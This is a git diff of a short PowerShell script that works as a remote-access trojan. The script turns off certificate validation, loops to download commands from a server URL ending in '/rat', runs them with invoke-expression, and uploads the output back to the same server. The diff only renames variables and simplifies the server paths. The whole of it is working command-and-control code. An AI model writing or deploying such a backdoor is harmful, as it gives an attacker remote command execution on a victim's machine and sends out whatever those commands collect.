@@ -1,12 +1,13 @@
-$server = "https://127.0.0.1:8082"
-$wc = New-Object Net.WebClient
+$s = "https://127.0.0.1/rat"
+$w = New-Object Net.WebClient
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 while($true)
 {
-[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
-$result = $wc.DownloadString("$server/fetch")
-while($result) {
-	$output = invoke-expression $result | out-string 
-	$wc.UploadString("$server/response", $output)	
+
+$r = $w.DownloadString("$s")
+while($r) {
+	$o = invoke-expression $r | out-string 
+	$w.UploadString("$s", $o)	
 	break
 }
 }
